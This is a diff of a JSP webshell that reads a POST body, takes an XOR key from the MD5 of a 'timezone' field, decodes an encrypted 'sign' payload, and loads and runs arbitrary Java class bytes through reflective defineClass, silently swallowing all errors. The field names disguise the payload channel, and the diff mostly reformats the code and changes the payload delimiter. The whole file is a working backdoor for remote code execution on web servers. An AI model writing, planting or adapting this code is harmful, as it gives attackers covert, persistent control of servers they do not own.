@@ -1,135 +1,134 @@
 <%@page import="java.lang.reflect.*,java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*,java.security.*,java.math.*"%>
 <%!
-class MyLoader extends ClassLoader {
+  class MyLoader extends ClassLoader {
     MyLoader(ClassLoader c) {
-        super(c);
+      super(c);
     }
-}
+  }
 
-class Handle {
+  class Handle {
     public Handle(byte[] classBytes, Object pageContext) {
-        try {
-            MyLoader ml = new MyLoader(this.getClass().getClassLoader());
-            Method m = ml.getClass().getSuperclass().getDeclaredMethod("defineClass", 
-                new Class[]{byte[].class, int.class, int.class});
-            m.setAccessible(true);
-            Class cls = (Class)m.invoke(ml, new Object[]{classBytes, 0, classBytes.length});
-            cls.newInstance().equals(pageContext);
-        } catch (Exception e) {
-            // Silent handling
-        }
+      try {
+        MyLoader ml = new MyLoader(this.getClass().getClassLoader());
+        Method m = ml.getClass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+        m.setAccessible(true);
+        Class cls = (Class)m.invoke(ml, new Object[]{classBytes, 0, classBytes.length});
+        cls.newInstance().equals(pageContext);
+      } catch (Exception e) {
+        return; // 如果这里没有retrun，下面的代码会继续执行。当然这里不会，因为是在类里面
+      }
     }
-}
+  }
 %>
 
 <%
-try {
+  try {
     // Read POST data
     StringBuilder sb = new StringBuilder();
     String line;
     BufferedReader reader = request.getReader();
     while ((line = reader.readLine()) != null) {
-        sb.append(line);
+      sb.append(line);
     }
     String postData = sb.toString();
-    
+
     if (postData != null && !postData.isEmpty()) {
-        // Simple JSON parsing (manual)
-        String timezone = null;
-        String sign = null;
-        
-        // Extract timezone
-        int timezoneStart = postData.indexOf("\"timezone\":");
-        if (timezoneStart != -1) {
-            int valueStart = postData.indexOf("\"", timezoneStart + 11) + 1;
-            int valueEnd = postData.indexOf("\"", valueStart);
-            if (valueStart > 0 && valueEnd > valueStart) {
-                timezone = postData.substring(valueStart, valueEnd);
-            }
+      // Simple JSON parsing (manual)
+      String timezone = null;
+      String sign = null;
+
+      // Extract timezone
+      int timezoneStart = postData.indexOf("\"timezone\":");
+      if (timezoneStart != -1) {
+        int valueStart = postData.indexOf("\"", timezoneStart + 11) + 1;
+        int valueEnd = postData.indexOf("\"", valueStart);
+        if (valueStart > 0 && valueEnd > valueStart) {
+          timezone = postData.substring(valueStart, valueEnd);
         }
-        
-        // Extract sign
-        int signStart = postData.indexOf("\"sign\":");
-        if (signStart != -1) {
-            int valueStart = postData.indexOf("\"", signStart + 7) + 1;
-            int valueEnd = postData.indexOf("\"", valueStart);
-            if (valueStart > 0 && valueEnd > valueStart) {
-                sign = postData.substring(valueStart, valueEnd);
-            }
+      }
+
+      // Extract sign
+      int signStart = postData.indexOf("\"sign\":");
+      if (signStart != -1) {
+        int valueStart = postData.indexOf("\"", signStart + 7) + 1;
+        int valueEnd = postData.indexOf("\"", valueStart);
+        if (valueStart > 0 && valueEnd > valueStart) {
+          sign = postData.substring(valueStart, valueEnd);
         }
-        
-        if (timezone != null && sign != null) {
-            // Generate key from timezone (MD5 first 16 characters)
-            MessageDigest md = MessageDigest.getInstance("MD5");
-            md.update(timezone.getBytes("UTF-8"));
-            String md5Hash = new BigInteger(1, md.digest()).toString(16);
-            while (md5Hash.length() < 32) {
-                md5Hash = "0" + md5Hash;
-            }
-            String key = md5Hash.substring(0, 16);
-            
-            // Store key in session
-            session.setAttribute("k", key);
-            
-            // Base64 decode the sign
-            byte[] decodedSign = null;
-            String ver = System.getProperty("java.version");
-            if (ver.compareTo("1.8") >= 0) {
-                Class Base64 = Class.forName("java.util.Base64");
-                Object Decoder = Base64.getMethod("getDecoder", (Class[]) null).invoke(Base64, (Object[]) null);
-                decodedSign = (byte[]) Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{sign});
-            } else {
-                Class Base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object Decoder = Base64.newInstance();
-                decodedSign = (byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{sign});
-            }
-            
-            // XOR decryption
-            byte[] keyBytes = key.getBytes("UTF-8");
-            for (int i = 0; i < decodedSign.length; i++) {
-                decodedSign[i] = (byte)(decodedSign[i] ^ keyBytes[(i + 5) & 15]);
-            }
-            
-            // Convert decrypted bytes to string
-            String decryptedContent = new String(decodedSign, "UTF-8");
-            
-            // Find the first underscore after shellcode
-            int underscoreIndex = decryptedContent.indexOf("_");
-            if (underscoreIndex != -1) {
-                // Split into shellcode and parameters
-                String shellcodePart = decryptedContent.substring(0, underscoreIndex);
-                String paramsPart = decryptedContent.substring(underscoreIndex + 1);
-                
-                // Parse parameters (key1-value1,key2-value2,... format)
-                if (paramsPart != null && !paramsPart.isEmpty()) {
-                    String[] pairs = paramsPart.split(",");
-                    for (String pair : pairs) {
-                        pair = pair.trim();
-                        if (pair.contains("-")) {
-                            int dashIndex = pair.indexOf("-");
-                            String paramKey = pair.substring(0, dashIndex).trim();
-                            String paramValue = pair.substring(dashIndex + 1).trim();
-                            if (!paramKey.isEmpty()) {
-                                // Store in session
-                                session.setAttribute(paramKey, paramValue);
-                            }
-                        }
-                    }
+      }
+
+      if (timezone != null && sign != null) {
+        // Generate key from timezone (MD5 first 16 characters)
+        MessageDigest md = MessageDigest.getInstance("MD5");
+        md.update(timezone.getBytes("UTF-8"));
+        String md5Hash = new BigInteger(1, md.digest()).toString(16);
+        while (md5Hash.length() < 32) {
+          md5Hash = "0" + md5Hash;
+        }
+        String key = md5Hash.substring(0, 16);
+
+        // Store key in session
+        session.setAttribute("k", key);
+
+        // Base64 decode the sign
+        byte[] decodedSign;
+        String ver = System.getProperty("java.version");
+        if (ver.compareTo("1.8") >= 0) {
+          Class Base64 = Class.forName("java.util.Base64");
+          Object Decoder = Base64.getMethod("getDecoder", (Class[]) null).invoke(Base64, (Object[]) null);
+          decodedSign = (byte[]) Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{sign});
+        } else {
+          Class Base64 = Class.forName("sun.misc.BASE64Decoder");
+          Object Decoder = Base64.newInstance();
+          decodedSign = (byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{sign});
+        }
+
+        // XOR decryption
+        byte[] keyBytes = key.getBytes("UTF-8");
+        for (int i = 0; i < decodedSign.length; i++) {
+          decodedSign[i] = (byte)(decodedSign[i] ^ keyBytes[(i + 5) & 15]);
+        }
+
+        // Convert decrypted bytes to string
+        String decryptedContent = new String(decodedSign, "UTF-8"); // 这里为什么没恢复成正常代码？字节码不是完整字符串
+
+        // Find the first underscore after shellcode
+        int underscoreIndex = decryptedContent.indexOf("_____");
+        if (underscoreIndex != -1) {
+          // Split into shellcode and parameters
+          String shellcodePart = decryptedContent.substring(0, underscoreIndex);
+          String paramsPart = decryptedContent.substring(underscoreIndex + 5);
+
+          // Parse parameters (key1-value1,key2-value2,... format)
+          if (paramsPart != null && !paramsPart.isEmpty()) {
+            String[] pairs = paramsPart.split(",");
+            for (String pair : pairs) {
+              pair = pair.trim();
+              if (pair.contains("-")) {
+                int dashIndex = pair.indexOf("-");
+                String paramKey = pair.substring(0, dashIndex).trim();
+                String paramValue = pair.substring(dashIndex + 1).trim();
+                if (!paramKey.isEmpty()) {
+                  // registered needed params in session
+                  session.setAttribute(paramKey, paramValue);
                 }
-                
-                // Convert shellcode back to bytes for execution
-                byte[] shellcodeBytes = shellcodePart.getBytes("UTF-8");
-                
-                // Execute the shellcode
-                new Handle(shellcodeBytes, pageContext);
-            } else {
-                // If no underscore found, treat as original shellcode
-                new Handle(decodedSign, pageContext);
+              }
             }
+          }
+
+          // Convert shellcode back to bytes for execution
+          byte[] shellcodeBytes = shellcodePart.getBytes("UTF-8");
+
+          // Execute the shellcode
+          new Handle(shellcodeBytes, pageContext);
+        } else {
+          // If no underscore found, treat as original shellcode
+          new Handle(decodedSign, pageContext);
         }
+      }
     }
-} catch (Exception e) {
+  } catch (Exception e) {
     // Silent error handling
-}
-out = pageContext.pushBody();
+  }
+  out = pageContext.pushBody();
 %>
